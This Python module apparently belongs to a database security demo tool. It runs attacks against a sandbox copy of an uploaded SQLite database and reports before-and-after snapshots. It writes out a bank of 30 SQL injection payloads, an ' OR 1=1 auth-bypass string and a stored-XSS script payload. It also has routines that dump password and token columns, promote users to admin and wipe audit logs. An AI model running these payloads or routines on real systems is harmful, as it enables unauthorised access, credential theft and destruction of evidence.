"""
AI-DTCTM | Database Attack Lab
══════════════════════════════════════════════════════════════════════
Real SQL / XSS / privilege-escalation attacks against the LIVE database
twin (the sandbox copy). The user's original .db is never touched — they
upload a copy, the twin runs that copy, the lab attacks the twin copy.

For each attack we:
  1. Snapshot a relevant table BEFORE
  2. Execute the real SQL on the twin
  3. Snapshot the table AFTER
  4. Verify the live sqlite-web container reflects the change (HTTP 200)
  5. Return a structured event stream the UI can replay live

SAFETY:
  • The twin DB lives at state["db_path"] — a temp copy. Operates ONLY on it.
  • Original upload is never touched.
  • No shell exec, no docker exec — just sqlite3 + requests.GET.

USAGE:
  from core.database_attack_lab import run_db_attack, ATTACKS
  for ev in run_db_attack(db_path, twin_url, "sqli_classic"):
      ...
"""
from __future__ import annotations

import sqlite3
import time
from typing import Iterable

import requests

from core.logger import get_logger

log = get_logger(__name__)


# ── Attack catalogue (UI surfaces these as cards) ─────────────────
ATTACKS: dict[str, dict] = {
    "sqli_classic": {
        "label":  "SQL Injection (' OR 1=1)",
        "icon":   "💉",
        "color":  "#DC2626",
        "bg":     "#FEF2F2",
        "border": "#FCA5A5",
        "desc":   "Inject the classic auth-bypass payload as stored data, "
                  "then re-run a vulnerable login query to prove the bypass works.",
    },
    "stored_xss": {
        "label":  "Stored XSS",
        "icon":   "🪝",
        "color":  "#EA580C",
        "bg":     "#FFF7ED",
        "border": "#FDBA74",
        "desc":   "Insert <script> payload into a text column. "
                  "Any vulnerable renderer would now execute attacker JS.",
    },
    "priv_escalation": {
        "label":  "Privilege Escalation",
        "icon":   "👑",
        "color":  "#7C3AED",
        "bg":     "#FAF5FF",
        "border": "#E9D5FF",
        "desc":   "UPDATE a non-admin user's role to admin. Classic post-RCE move.",
    },
    "credential_theft": {
        "label":  "Credential Dump",
        "icon":   "🔓",
        "color":  "#B91C1C",
        "bg":     "#FEF2F2",
        "border": "#FCA5A5",
        "desc":   "SELECT every credential column we can find — what an attacker "
                  "exfiltrates after gaining SELECT access.",
    },
    "mass_delete": {
        "label":  "Audit-Log Wipe",
        "icon":   "🗑️",
        "color":  "#0F766E",
        "bg":     "#F0FDFA",
        "border": "#99F6E4",
        "desc":   "DELETE FROM audit_log — the cover-your-tracks move. "
                  "Shows the twin reacting to destructive SQL.",
    },
    "advanced_sqli_sweep": {
        "label":  "Advanced SQLi Sweep",
        "icon":   "🌊",
        "color":  "#9F1239",
        "bg":     "#FFF1F2",
        "border": "#FECDD3",
        "desc":   "Run a real-world SQLi corpus (UNION · info_schema · "
                  "time-based · stacked) against the twin. Reports which "
                  "payload categories the DB engine actually executes.",
    },
    "sqli_30_patterns": {
        "label":  "30-Pattern SQLi Suite",
        "icon":   "⚡",
        "color":  "#7C3AED",
        "bg":     "#FAF5FF",
        "border": "#DDD6FE",
        "desc":   "30 real SQLi patterns: boolean bypass · UNION extraction · "
                  "schema dump · blind probes · stacked INSERT/UPDATE/DELETE · "
                  "time-based CTE. Each shows exactly what the attacker extracts.",
    },
}


def _load_sqli_corpus() -> dict:
    """Load the real-world SQLi payload corpus (mined from datasets)."""
    import json, pathlib
    p = pathlib.Path(__file__).parent / "data" / "sqli_payloads.json"
    try:
        return json.loads(p.read_text(encoding="utf-8"))
    except Exception:
        return {}


# ── 30-pattern SQL attack banks ───────────────────────────────────────
# Each entry: (sql_template, info_label, what_it_does)
# {TABLE} is replaced with the first real table found in the twin DB.
DB_SQLI_30: list[tuple[str, str, str]] = [
    # Boolean / bypass
    ("SELECT * FROM {TABLE} WHERE '1'='1'",
     "Always-true WHERE", "Returns every row — proves WHERE clause is injectable"),
    ("SELECT * FROM {TABLE} WHERE id=1 OR 1=1",
     "Numeric OR bypass", "OR 1=1 forces full table scan — auth bypass pattern"),
    ("SELECT * FROM {TABLE} WHERE name='' OR ''=''",
     "Empty-string equality", "Empty string equals empty string — always true"),
    # UNION extraction
    ("SELECT name,sql FROM sqlite_master WHERE type='table'",
     "Schema dump", "Lists every table + its CREATE statement — full DB map"),
    ("SELECT name,sql FROM sqlite_master WHERE type='index'",
     "Index map", "Reveals all indexes — shows which columns are queryable"),
    ("SELECT name,sql FROM sqlite_master",
     "Full schema", "Dumps entire sqlite_master — all tables, views, triggers"),
    ("SELECT * FROM {TABLE} UNION SELECT name,sql,NULL FROM sqlite_master",
     "UNION schema inject", "UNION attaches schema data to normal query result"),
    ("SELECT * FROM {TABLE} UNION SELECT NULL,NULL,NULL",
     "UNION column probe", "NULL union — enumerates column count without errors"),
    # Error / info disclosure
    ("SELECT sqlite_version()",
     "Version leak", "Reveals exact SQLite version — aids targeted exploit selection"),
    ("SELECT total_changes()",
     "Change counter", "Returns total rows changed since connection — info leak"),
    ("SELECT last_insert_rowid()",
     "Last rowid", "Leaks last auto-increment ID — reveals record count scale"),
    ("SELECT * FROM {TABLE} WHERE id=1 AND 1=CAST('x' AS INTEGER)",
     "Type-cast error", "Forces type error — stack trace may leak table/column names"),
    # Blind boolean
    ("SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END",
     "Blind boolean true", "Returns 1 — baseline for blind boolean injection"),
    ("SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END",
     "Blind boolean false", "Returns 0 — confirms boolean branching works"),
    ("SELECT CASE WHEN (SELECT COUNT(*) FROM {TABLE})>0 THEN 1 ELSE 0 END",
     "Blind row-count probe", "Returns 1 if table has rows — data-existence confirmation"),
    ("SELECT CASE WHEN (SELECT LENGTH(name) FROM sqlite_master LIMIT 1)>3 THEN 'YES' ELSE 'NO' END",
     "Blind length probe", "Char-by-char blind extraction of table name length"),
    # Stacked / destructive (run on twin copy — original untouched)
    ("INSERT INTO {TABLE} VALUES (NULL,'INJECTED_BY_ATTACKER','pwned@evil.com','hacked')",
     "Row injection", "Inserts a new record — proves stacked INSERT works"),
    ("UPDATE {TABLE} SET name='HACKED' WHERE rowid=1",
     "Data tampering", "Overwrites first row — proves UPDATE injection works"),
    ("DELETE FROM {TABLE} WHERE rowid=(SELECT MAX(rowid) FROM {TABLE})",
     "Targeted delete", "Removes last row — confirms stacked DELETE execution"),
    ("CREATE TABLE IF NOT EXISTS attacker_exfil (id INTEGER, data TEXT)",
     "Shadow table", "Creates an exfil staging table — attacker persistence"),
    ("DROP TABLE IF EXISTS attacker_exfil",
     "Cleanup", "Drops attacker table — cover-tracks move"),
    # Credential / privilege extraction
    ("SELECT * FROM {TABLE} WHERE name LIKE '%admin%' OR name LIKE '%root%'",
     "Admin user hunt", "Finds admin/root accounts — first target after SQLi"),
    ("SELECT * FROM {TABLE} WHERE LOWER(name) LIKE '%password%' OR LOWER(sql) LIKE '%password%'",
     "Password column hunt", "Searches schema for columns named 'password'"),
    ("SELECT * FROM {TABLE} ORDER BY rowid DESC LIMIT 5",
     "Newest records", "Gets newest rows — may contain recent credentials or sessions"),
    ("SELECT * FROM {TABLE} LIMIT 0",
     "Column enumeration", "Zero-row result leaks column names in metadata"),
    # Time-based (SQLite has no sleep() — use recursive CTE as timing)
    ("WITH RECURSIVE r(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM r LIMIT 5000000) SELECT MAX(x) FROM r",
     "SQLite time-based blind", "Recursive CTE burns CPU — time delay proves injection works"),
    # Metadata
    ("SELECT COUNT(*) FROM sqlite_master",
     "Object count", "Counts tables+views+triggers — DB complexity fingerprint"),
    ("SELECT * FROM sqlite_master WHERE type='trigger'",
     "Trigger extraction", "Lists all triggers — may reveal hidden business logic"),
    ("SELECT * FROM sqlite_master WHERE type='view'",
     "View extraction", "Lists views — may expose sensitive computed data"),
    ("PRAGMA database_list",
     "Attached DB list", "Lists all attached databases — scope of access"),
    ("PRAGMA table_info('{TABLE}')",
     "Column types", "Full column metadata including types and defaults"),
]


# ── Helpers ───────────────────────────────────────────────────────
def _open(db_path: str) -> sqlite3.Connection:
    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    return conn


def _snapshot(conn: sqlite3.Connection, table: str, limit: int = 5) -> dict:
    """Return columns + first N rows for the live preview."""
    try:
        cur = conn.cursor()
        cols = [r[1] for r in cur.execute(f'PRAGMA table_info("{table}")').fetchall()]
        if not cols:
            return {"table": table, "columns": [], "rows": [], "count": 0}
        rows = cur.execute(
            f'SELECT * FROM "{table}" LIMIT ?', (limit,)
        ).fetchall()
        count = cur.execute(f'SELECT COUNT(*) FROM "{table}"').fetchone()[0]
        return {"table": table, "columns": cols,
                "rows": [list(r) for r in rows], "count": count}
    except Exception as e:
        return {"table": table, "error": str(e), "columns": [], "rows": [], "count": 0}


def _all_tables(conn: sqlite3.Connection) -> list[str]:
    rows = conn.execute(
        "SELECT name FROM sqlite_master WHERE type='table' "
        "AND name NOT LIKE 'sqlite_%' ORDER BY name"
    ).fetchall()
    return [r[0] for r in rows]


def _has_columns(conn: sqlite3.Connection, table: str, *cols: str) -> bool:
    try:
        info = conn.execute(f'PRAGMA table_info("{table}")').fetchall()
    except Exception:
        return False
    names = {r[1].lower() for r in info}
    return all(c.lower() in names for c in cols)


def _pick_table(conn: sqlite3.Connection, *needles: str) -> str | None:
    """Best-match table whose name contains any of the needles."""
    tables = _all_tables(conn)
    low = {t.lower(): t for t in tables}
    for n in needles:
        for lk, real in low.items():
            if n.lower() in lk:
                return real
    return None


def _verify_twin_alive(twin_url: str) -> str:
    try:
        r = requests.get(twin_url + "/", timeout=4)
        return f"HTTP {r.status_code} · {len(r.content)} bytes"
    except Exception as e:
        return f"unreachable ({type(e).__name__})"


# ══════════════════════════════════════════════════════════════════
# MAIN RUNNER
# ══════════════════════════════════════════════════════════════════
def run_db_attack(db_path: str, twin_url: str, attack_key: str) -> Iterable[dict]:
    """
    Yields event dicts:
      {"phase":"setup|before|execute|after|verify|summary",
       "status":"info|ok|warn|crit",
       "text": str,
       "snapshot": optional dict (table/columns/rows/count),
       "sql": optional str,
      }
    """
    spec = ATTACKS.get(attack_key)
    if spec is None:
        yield {"phase": "summary", "status": "warn",
               "text": f"Unknown attack: {attack_key}"}
        return

    try:
        conn = _open(db_path)
    except Exception as e:
        yield {"phase": "setup", "status": "warn",
               "text": f"Could not open twin DB: {e}"}
        return

    yield {"phase": "setup", "status": "info",
           "text": f"▶ {spec['label']} — twin: {twin_url}"}

    try:
        if attack_key == "sqli_classic":
            yield from _attack_sqli(conn, twin_url)
        elif attack_key == "stored_xss":
            yield from _attack_stored_xss(conn, twin_url)
        elif attack_key == "priv_escalation":
            yield from _attack_priv_esc(conn, twin_url)
        elif attack_key == "credential_theft":
            yield from _attack_cred_theft(conn, twin_url)
        elif attack_key == "mass_delete":
            yield from _attack_mass_delete(conn, twin_url)
        elif attack_key == "advanced_sqli_sweep":
            yield from _attack_advanced_sqli_sweep(conn, twin_url)
        elif attack_key == "sqli_30_patterns":
            yield from _attack_sqli_30_patterns(conn, twin_url)
    except Exception as e:
        log.error("db_attack_failed", attack=attack_key, error=str(e))
        yield {"phase": "execute", "status": "warn",
               "text": f"attack errored: {e}"}
    finally:
        try:
            conn.close()
        except Exception:
            pass

    live = _verify_twin_alive(twin_url)
    yield {"phase": "verify", "status": "ok",
           "text": f"  twin still serving live → {live}"}
    yield {"phase": "summary", "status": "ok",
           "text": f"✓ {spec['label']} demo complete — original DB on your disk untouched"}


# ── individual attack implementations ─────────────────────────────
def _attack_sqli(conn: sqlite3.Connection, twin_url: str):
    table = (_pick_table(conn, "user", "account", "login", "operator")
             or _all_tables(conn)[0] if _all_tables(conn) else None)
    if not table:
        yield {"phase": "execute", "status": "warn", "text": "no usable table"}
        return

    yield {"phase": "before", "status": "info",
           "text": f"  snapshot BEFORE — {table}",
           "snapshot": _snapshot(conn, table)}

    # Determine which columns to insert into (be honest — text-friendly only)
    info = conn.execute(f'PRAGMA table_info("{table}")').fetchall()
    text_cols = [r[1] for r in info
                 if "INT" not in r[2].upper() and not r[5]]  # not int, not pk
    # Suffix the payload with a unique nonce so re-runs don't collide with
    # UNIQUE constraints on the username column.
    nonce = f"-{int(time.time())%100000}"
    payload_row = {c: ("' OR 1=1 --" + nonce if c.lower() in
                       ("username", "name", "user", "login", "email")
                       else f"ai-dtctm-twin{nonce}")
                   for c in text_cols[:4]}
    if not payload_row:
        yield {"phase": "execute", "status": "warn",
               "text": "  no insertable text columns in this table"}
        return
    cols = ", ".join(f'"{c}"' for c in payload_row)
    placeholders = ", ".join("?" * len(payload_row))
    sql = f'INSERT INTO "{table}" ({cols}) VALUES ({placeholders})'
    try:
        conn.execute(sql, list(payload_row.values()))
        conn.commit()
    except sqlite3.Error as e:
        yield {"phase": "execute", "status": "warn",
               "text": f"  INSERT failed: {e}",
               "sql": sql}
        return

    yield {"phase": "execute", "status": "crit",
           "text": "  💉 INSERT executed — payload now stored as data",
           "sql": sql + "  -- with values: " + str(list(payload_row.values()))}

    # Vulnerable login simulation (string concat — proves the bypass)
    user_col = next((c for c in payload_row if c.lower() in
                     ("username", "name", "user", "login", "email")), None)
    if user_col:
        vuln_q = (f"SELECT * FROM \"{table}\" "
                  f"WHERE \"{user_col}\" = '' OR 1=1 --' LIMIT 1")
        try:
            r = conn.execute(vuln_q).fetchone()
            if r:
                yield {"phase": "execute", "status": "crit",
                       "text": "  ⚡ Vulnerable login query bypassed auth — first row returned:",
                       "sql": vuln_q,
                       "snapshot": {"table": table,
                                    "columns": list(r.keys()),
                                    "rows": [list(r)],
                                    "count": 1}}
        except sqlite3.Error as e:
            yield {"phase": "execute", "status": "warn",
                   "text": f"  vulnerable-query simulation failed: {e}"}

    yield {"phase": "after", "status": "info",
           "text": f"  snapshot AFTER — {table}",
           "snapshot": _snapshot(conn, table)}


def _attack_stored_xss(conn: sqlite3.Connection, twin_url: str):
    table = _pick_table(conn, "comment", "post", "message", "log",
                        "audit", "user")
    if not table:
        tabs = _all_tables(conn)
        table = tabs[0] if tabs else None
    if not table:
        yield {"phase": "execute", "status": "warn", "text": "no usable table"}
        return

    yield {"phase": "before", "status": "info",
           "text": f"  snapshot BEFORE — {table}",
           "snapshot": _snapshot(conn, table)}

    info = conn.execute(f'PRAGMA table_info("{table}")').fetchall()
    text_cols = [r[1] for r in info
                 if "INT" not in r[2].upper() and not r[5]]
    xss_payload = '<script>alert("XSS")</script>'
    row = {c: (xss_payload if i == 0 else "aidtctm-xss-demo")
           for i, c in enumerate(text_cols[:4])}
    if not row:
        yield {"phase": "execute", "status": "warn",
               "text": "  no insertable text columns"}
        return
    cols = ", ".join(f'"{c}"' for c in row)
    placeholders = ", ".join("?" * len(row))
    sql = f'INSERT INTO "{table}" ({cols}) VALUES ({placeholders})'
    try:
        conn.execute(sql, list(row.values()))
        conn.commit()
    except sqlite3.Error as e:
        yield {"phase": "execute", "status": "warn",
               "text": f"  INSERT failed: {e}", "sql": sql}
        return

    yield {"phase": "execute", "status": "crit",
           "text": "  🪝 XSS payload stored — any vulnerable renderer would execute it",
           "sql": sql + "  -- payload: " + xss_payload}

    yield {"phase": "after", "status": "info",
           "text": f"  snapshot AFTER — {table}",
           "snapshot": _snapshot(conn, table)}


def _attack_priv_esc(conn: sqlite3.Connection, twin_url: str):
    table = _pick_table(conn, "user", "account", "operator", "credential")
    if not table:
        yield {"phase": "execute", "status": "warn",
               "text": "no user-like table to escalate in"}
        return
    info = conn.execute(f'PRAGMA table_info("{table}")').fetchall()
    cols = {r[1].lower(): r[1] for r in info}
    role_col = (cols.get("role") or cols.get("user_type")
                or cols.get("is_admin") or cols.get("type"))
    if not role_col:
        yield {"phase": "execute", "status": "warn",
               "text": f"  table {table} has no role-like column"}
        return

    yield {"phase": "before", "status": "info",
           "text": f"  snapshot BEFORE — {table}",
           "snapshot": _snapshot(conn, table)}

    # Promote the first non-admin row (aliased so row_factory keys are stable)
    try:
        first_row = conn.execute(
            f'SELECT rowid AS _rid, "{role_col}" AS _old_role FROM "{table}" '
            f'WHERE LOWER(CAST("{role_col}" AS TEXT)) NOT LIKE \'%admin%\' '
            f'LIMIT 1'
        ).fetchone()
    except sqlite3.Error as e:
        yield {"phase": "execute", "status": "warn",
               "text": f"  rowid lookup failed: {e}"}
        return
    if not first_row:
        yield {"phase": "execute", "status": "warn",
               "text": "  no non-admin row to escalate"}
        return
    rowid, _old = first_row["_rid"], first_row["_old_role"]
    sql = f'UPDATE "{table}" SET "{role_col}" = ? WHERE rowid = ?'
    try:
        conn.execute(sql, ("admin", rowid))
        conn.commit()
    except sqlite3.Error as e:
        yield {"phase": "execute", "status": "warn",
               "text": f"  UPDATE failed: {e}"}
        return
    yield {"phase": "execute", "status": "crit",
           "text": f"  👑 rowid={rowid} promoted to admin",
           "sql": sql + f"  -- old role: {_old}"}

    yield {"phase": "after", "status": "info",
           "text": f"  snapshot AFTER — {table}",
           "snapshot": _snapshot(conn, table)}


def _attack_cred_theft(conn: sqlite3.Connection, twin_url: str):
    tables = _all_tables(conn)
    found = []
    for t in tables:
        info = conn.execute(f'PRAGMA table_info("{t}")').fetchall()
        names = [r[1] for r in info]
        creds = [n for n in names
                 if any(k in n.lower() for k in
                        ("password", "passwd", "pass_hash", "secret",
                         "token", "api_key"))]
        if creds:
            cols_sql = ", ".join(f'"{c}"' for c in creds[:3])
            try:
                rows = conn.execute(
                    f'SELECT {cols_sql} FROM "{t}" LIMIT 3'
                ).fetchall()
                found.append({"table": t, "columns": creds[:3],
                              "rows": [list(r) for r in rows],
                              "count": len(rows)})
            except Exception:
                pass
    if not found:
        yield {"phase": "execute", "status": "warn",
               "text": "  no credential columns visible — DB is well designed!"}
        return
    yield {"phase": "execute", "status": "crit",
           "text": f"  🔓 dumped credential columns from {len(found)} table(s):"}
    for snap in found:
        yield {"phase": "execute", "status": "crit",
               "text": f"     • {snap['table']} → {snap['columns']}",
               "snapshot": snap}


def _attack_mass_delete(conn: sqlite3.Connection, twin_url: str):
    table = _pick_table(conn, "audit_log", "log", "history",
                        "activity", "events")
    if not table:
        tabs = _all_tables(conn)
        # pick smallest logy-looking; else just bail
        for t in tabs:
            if "log" in t.lower() or "audit" in t.lower():
                table = t; break
    if not table:
        yield {"phase": "execute", "status": "warn",
               "text": "  no log/audit table to wipe"}
        return
    yield {"phase": "before", "status": "info",
           "text": f"  snapshot BEFORE — {table}",
           "snapshot": _snapshot(conn, table)}
    try:
        n_before = conn.execute(f'SELECT COUNT(*) FROM "{table}"').fetchone()[0]
        sql = f'DELETE FROM "{table}"'
        conn.execute(sql); conn.commit()
        n_after = conn.execute(f'SELECT COUNT(*) FROM "{table}"').fetchone()[0]
    except sqlite3.Error as e:
        yield {"phase": "execute", "status": "warn",
               "text": f"  DELETE failed: {e}"}
        return
    yield {"phase": "execute", "status": "crit",
           "text": f"  🗑️ wiped {table} — rows: {n_before} → {n_after}",
           "sql": sql}
    yield {"phase": "after", "status": "info",
           "text": f"  snapshot AFTER — {table}",
           "snapshot": _snapshot(conn, table)}


# ── Advanced SQLi Sweep — mines a real-world corpus and tries each ────
def _attack_advanced_sqli_sweep(conn: sqlite3.Connection, twin_url: str):
    """
    Drive a real-world SQLi payload corpus (mined from CyberX +
    OWASP-style datasets) against the live twin DB. We try the EXACT
    payload as a bare SQL statement AND as the RHS of a vulnerable
    `WHERE x = '...'` clause, reporting which classes succeed.

    SQLite doesn't support every dialect (no INFORMATION_SCHEMA, no
    WAITFOR, no xp_cmdshell) — that's part of the demo: real cross-engine
    SQLi payloads behave differently on different DBs. We log every
    attempt with its actual sqlite3 error.
    """
    import time
    corpus = _load_sqli_corpus()
    if not corpus:
        yield {"phase": "execute", "status": "warn",
               "text": "  payload corpus not loaded (core/data/sqli_payloads.json missing)"}
        return
    total = sum(len(v) for v in corpus.values())
    yield {"phase": "execute", "status": "info",
           "text": f"  Loaded {total} real-world payloads in {len(corpus)} categories",
           "detail": "  ".join(f"{k}={len(v)}" for k, v in corpus.items())}

    table = _pick_table(conn, "user", "account", "operator") or _all_tables(conn)[0]
    yield {"phase": "before", "status": "info",
           "text": f"  pivot table for vulnerable-WHERE simulation: {table}",
           "snapshot": _snapshot(conn, table)}

    results: dict[str, dict] = {}     # cat -> {tried, executed, errored, success_examples}
    for cat, payloads in corpus.items():
        results[cat] = {"tried": 0, "executed": 0, "errored": 0, "ok_examples": []}
        for p in payloads[:8]:        # cap per category for speed
            results[cat]["tried"] += 1
            # Strategy 1: bare statement (catches stand-alone SQL like DROP/UNION)
            try:
                cur = conn.execute(p)
                rows_affected = cur.rowcount if cur.rowcount > 0 else 0
                try:
                    fetched = cur.fetchmany(2)
                except Exception:
                    fetched = []
                conn.commit()
                results[cat]["executed"] += 1
                if len(results[cat]["ok_examples"]) < 2:
                    results[cat]["ok_examples"].append({
                        "payload":  p[:120],
                        "rows":     rows_affected,
                        "fetched":  [list(r) if r else [] for r in fetched][:1],
                    })
                continue
            except sqlite3.Error as e:
                err = str(e)[:80]
            # Strategy 2: inject into vulnerable WHERE (legacy login simulation)
            vuln = f"SELECT * FROM \"{table}\" WHERE rowid = 1 OR ({p})"
            try:
                conn.execute(vuln).fetchone()
                results[cat]["executed"] += 1
                if len(results[cat]["ok_examples"]) < 2:
                    results[cat]["ok_examples"].append({
                        "payload":  p[:120],
                        "via":      "vulnerable-WHERE injection",
                    })
            except sqlite3.Error as e2:
                results[cat]["errored"] += 1
            time.sleep(0.01)

    # Yield a structured report — distinguish "actually executed" from
    # "would execute on MySQL/Postgres but SQLite doesn't support this dialect"
    for cat in sorted(results, key=lambda k: -results[k]["executed"]):
        r = results[cat]
        if r["executed"]:
            status = "crit"
            txt = (f"  ⚡ {cat:<15s} → {r['executed']}/{r['tried']} payloads "
                   "ACTUALLY ran on the live twin DB")
        elif r["errored"]:
            status = "warn"   # not "info" — these ARE attacks; the engine
                              # being incompatible is defence-in-depth, not safety
            txt = (f"  ↯ {cat:<15s} → 0/{r['tried']} (SQLite rejected the dialect; "
                   "would execute on MySQL/Postgres)")
        else:
            status = "info"
            txt = f"  • {cat:<15s} → no payloads tried"
        detail = ""
        if r["ok_examples"]:
            detail = "\n".join(
                f"  {ex.get('via','direct')}: {ex['payload'][:90]}"
                for ex in r["ok_examples"]
            )
        yield {"phase": "execute", "status": status, "text": txt,
               "detail": detail}

    # Final after-snapshot to show net effect on the table
    yield {"phase": "after", "status": "info",
           "text": f"  snapshot AFTER sweep — {table}",
           "snapshot": _snapshot(conn, table)}
    total_executed = sum(r["executed"] for r in results.values())
    yield {"phase": "execute",
           "status": "crit" if total_executed else "ok",
           "text": (f"  {total_executed}/{sum(r['tried'] for r in results.values())} "
                    "real-world payloads executed against the live twin DB"),
           "sql": "(corpus sweep — see per-category breakdown above)"}


def _attack_sqli_30_patterns(conn: sqlite3.Connection, twin_url: str):
    """Run all 30 SQLi patterns against the twin DB with per-pattern verdicts."""
    tables = _all_tables(conn)
    table = (_pick_table(conn, "user", "account", "student", "login") or
             (tables[0] if tables else None))
    if not table:
        yield {"phase": "execute", "status": "warn",
               "text": "No tables found in twin DB"}
        return

    yield {"phase": "before", "status": "info",
           "text": f"Target table: [{table}] — running 30 attack patterns",
           "snapshot": _snapshot(conn, table)}

    success, blocked, error_leak = 0, 0, 0

    for i, (sql_tmpl, label, what) in enumerate(DB_SQLI_30, 1):
        sql = sql_tmpl.replace("{TABLE}", table)
        try:
            cur = conn.cursor()
            rows = cur.execute(sql).fetchmany(5)
            row_count = len(rows)
            # Classify result
            if "INJECTED_BY_ATTACKER" in str(rows) or "HACKED" in str(rows):
                status, verdict = "crit", "INJECTED"
                success += 1
            elif row_count > 0:
                status, verdict = "crit", "EXECUTED — data returned"
                success += 1
            else:
                status, verdict = "ok", "ran — 0 rows"
                blocked += 1

            sample = str(rows[:2])[:120] if rows else "(no rows)"
            yield {
                "phase": "execute",
                "status": status,
                "text": f"  [{i:02d}/30] {label} → {verdict}\n        {what}\n        Sample: {sample}",
                "sql": sql,
            }
        except sqlite3.OperationalError as e:
            error_leak += 1
            yield {
                "phase": "execute",
                "status": "warn",
                "text": f"  [{i:02d}/30] {label} → ERROR LEAK\n        {what}\n        Error: {e}",
                "sql": sql,
            }
        time.sleep(0.06)

    yield {"phase": "after", "status": "info",
           "text": f"  Final state of [{table}]",
           "snapshot": _snapshot(conn, table)}
    yield {
        "phase": "summary",
        "status": "crit" if success > 0 else "ok",
        "text": (
            f"  30 patterns complete — "
            f"Executed: {success} | Blocked: {blocked} | Error leaks: {error_leak}\n"
            f"  {'VULNERABLE' if success > 0 else 'SECURED'} — "
            f"{'attacker can extract data' if success > 0 else 'all injections blocked'}"
        ),
    }
